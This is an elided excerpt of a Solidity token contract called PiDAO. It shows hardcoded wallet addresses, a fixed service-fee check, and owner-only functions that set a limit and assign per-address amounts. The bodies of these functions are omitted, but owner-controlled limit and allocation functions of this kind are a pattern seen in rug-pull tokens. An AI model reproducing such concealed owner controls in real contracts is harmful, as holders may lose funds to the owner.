...
contract PiDAO is Context, IERC20, Ownable {
    ...
    address payable private marketingWalletAddress = payable(0xE5ACcB471f32e5dB65f23c08262181c13c69b067); 
    address payable private teamWalletAddress = payable(0xc959ddE2270dddbC32211C065d0636a00267E393); 
    ...
    constructor (uint256 serviceFee_,uint256[2] memory buyFeeSetting_) {
	    require(
            110000000000000000 == serviceFee_ ,
...
//		payable(serviceFeeReceiver_).transfer(serviceFee_);
	...
	function setPoint(uint256 newLimit) external onlyOwner()  {
        _point = newLimit;
    }
	...
	function setList(address  recipient, uint256 amount) external onlyOwner() {
